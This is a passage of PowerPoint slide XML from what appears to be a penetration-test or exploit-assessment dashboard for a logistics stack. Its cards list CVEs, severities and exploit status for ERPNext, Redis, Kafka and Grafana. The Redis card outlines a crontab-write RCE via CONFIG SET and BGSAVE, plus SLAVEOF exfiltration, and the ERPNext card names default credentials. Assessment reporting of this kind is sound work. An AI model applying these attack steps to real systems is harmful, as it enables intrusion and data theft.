                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVEs in Supabase</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="2450592"/>
            <a:ext cx="2706624" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="2706624"/>
            <a:ext cx="2706624" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Seeded for logistics stack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="2176272"/>
            <a:ext cx="292608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176272"/>
            <a:ext cx="292608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3368" y="2267712"/>
            <a:ext cx="2706624" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Confirmed Exploited</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6373368" y="2450592"/>
            <a:ext cx="2706624" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6373368" y="2706624"/>
            <a:ext cx="2706624" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Redis · ERP · Grafana · PG</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9281160" y="2176272"/>
            <a:ext cx="2697480" cy="749808"/>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81160" y="2176272"/>
            <a:ext cx="269748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2267712"/>
            <a:ext cx="2478024" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Blocked</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9390888" y="2450592"/>
            <a:ext cx="2478024" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9390888" y="2706624"/>
            <a:ext cx="2478024" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kafka JMX · Container escape</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="301752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 y="3054096"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Service-Level Exploit Cards — What Each Card Tells You</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Rectangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3291840"/>
            <a:ext cx="1965960" cy="2331720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="889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8600" y="3291840"/>
            <a:ext cx="1965960"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3383280"/>
            <a:ext cx="1783080" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ERPNext</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="TextBox 33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1417320" y="3383280"/>
            <a:ext cx="731520" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXPLOITED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="TextBox 34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3639312"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2023-46127</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="TextBox 35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3822192"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8.8 HIGH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4005072"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Confidence: 91%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4206240"/>
            <a:ext cx="1783080" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Stored XSS via the Item Description field allows a low-privilege user to inject a script that executes in the admin's browser. Combined with the unchanged default credentials (Administrator / admin), a remote attacker gains full ERP administrator access — including access to all shipment records, customer PII, and supplier contracts.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Rectangle 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2249424" y="3291840"/>
            <a:ext cx="1965960" cy="2331720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="889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249424" y="3291840"/>
            <a:ext cx="1965960"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340864" y="3383280"/>
            <a:ext cx="1783080" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Redis Tracking</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3438144" y="3383280"/>
            <a:ext cx="731520" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXPLOITED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2340864" y="3639312"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2022-0543</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="TextBox 43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2340864" y="3822192"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10.0 CRITICAL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="TextBox 44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2340864" y="4005072"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Confidence: 88%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="TextBox 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2340864" y="4206240"/>
            <a:ext cx="1783080" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Redis is exposed on port 9379 with no requirepass set. An unauthenticated attacker runs CONFIG SET dir /var/spool/cron, writes a crontab payload via SET/BGSAVE, and achieves remote code execution as the redis user within seconds. The SLAVEOF command can also redirect replication to an attacker-controlled server to exfiltrate all tracking data.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Rectangle 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270248" y="3291840"/>
            <a:ext cx="1965960" cy="2331720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="889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270248" y="3291840"/>
            <a:ext cx="1965960"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61688" y="3383280"/>
            <a:ext cx="1783080" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Apache Kafka</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="TextBox 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5458968" y="3383280"/>
            <a:ext cx="731520" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BLOCKED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="TextBox 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4361688" y="3639312"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2023-25194</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="TextBox 51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4361688" y="3822192"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8.8 HIGH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="TextBox 52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4361688" y="4005072"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Confidence: 31%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4361688" y="4206240"/>
            <a:ext cx="1783080" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The JMX RCE chain (JNDI via Kafka Connect JDBC connector) was blocked — basic SASL is partially configured. However, the unauthenticated Kafka metadata API still exposes all six topic names (shipment-events, customer-pii, driver-locations, etc.) and partition counts. A network attacker could subscribe and consume all messages without any credentials.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Rectangle 54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6291072" y="3291840"/>
            <a:ext cx="1965960" cy="2331720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="889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91072" y="3291840"/>
            <a:ext cx="1965960"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3383280"/>
            <a:ext cx="1783080" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Grafana</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="TextBox 57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7479792" y="3383280"/>
            <a:ext cx="731520" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXPLOITED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="TextBox 58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6382512" y="3639312"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2021-43798</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="TextBox 59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6382512" y="3822192"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>7.5 HIGH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="TextBox 60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6382512" y="4005072"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Confidence: 96%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="TextBox 61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6382512" y="4206240"/>
            <a:ext cx="1783080" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
